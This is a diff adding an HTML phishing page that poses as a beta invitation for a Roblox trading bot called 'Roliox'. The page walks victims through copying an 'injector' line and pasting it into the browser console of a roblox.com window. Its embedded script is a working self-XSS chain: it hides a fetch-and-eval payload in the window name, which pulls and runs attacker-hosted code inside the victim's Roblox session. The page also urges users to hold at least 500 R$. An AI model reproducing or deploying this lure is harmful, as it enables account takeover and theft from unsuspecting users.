@@ -1,0 +1,54 @@
+<html>
+<head>
+</head>
+
+<body>
+	<h2>Roliox fdsf Sniper</h2>
+
+	<p>
+		Roliox is an advanced Javascript-based limited sniper & auto-seller for Roblox. It is capable of scanning items up-to 10x faster than other competitors via WebSocket technology.
+		<br/>You're one of the few lucky people who have been invited to become a beta tester to help us eliminate bugs and glitches before our official launch.
+		
+		<br><br/>To do this, all you need to do is follow the setup instructions below and report any oddities you find by contacting the developer on Discord at <b>{discordContact}</b></a>.
+
+		<br/><br/>Your license is valid until <b>February 17th, 2020 00:00 AM PST</b>
+	</p>
+
+	<h3>Setup Instructions</h3>
+	<p>1. Copy the injector code to your clipboard by clicking <button onclick="copyPayload1()">here</button></p>
+	<p>2. Click <button onclick="openRobloxWindow()">here</button> to launch the terminal window</p>
+	<p>3. Right click on the opened window and select <b>Inspect</b>, and then click on tab titled <b>Console</b> <br/><img src="https://i.imgur.com/b9B9eOa.png"><img src="https://i.imgur.com/03PSDb5.png"></p>
+	<p>4. Paste in the code and press enter, you should be instantly greeted by our logo.</p>
+	<img src="https://i.imgur.com/wkQLoHJ.png">
+	
+	<h3>Usage</h3>
+	<p>Just keep the terminal running in the background and you should start getting snipes within an hour or so.</p>
+	<p>We currently do not have a settings panel (soon TM), but everything is pre-configured to the best possible performance.</p>
+	<b>It is recommended that you have at-least 500 R$ in your account.</b>
+	
+	<br/><br/>
+	
+	<img src="screenshot1.png">
+
+	<script>
+		var url = 'https://www.roblox.com/robots.txt#/statusofitem /?whitelistKey=ab851a754c8c6424d4d31d8caf8206d6'
+		var payload1 = '(itemStatus=>{location=name;125})()'
+		var payload2 = 'fetch("//'+location.hostname+location.pathname+'?p").then(async x=>eval(await x.text()))'
+		
+		function openRobloxWindow() {
+			var win = window.open(url, "javascript:"+payload2, 'height=350,width=750,location=no')
+		}
+		
+		function copyPayload1() {
+			var input = document.createElement('input')
+			input.setAttribute('value', payload1)
+			document.body.appendChild(input)
+			input.select()
+			var result = document.execCommand('copy')
+			document.body.removeChild(input)
+			
+			alert("Copied!")
+		}
+	</script>
+</body>
+</html>
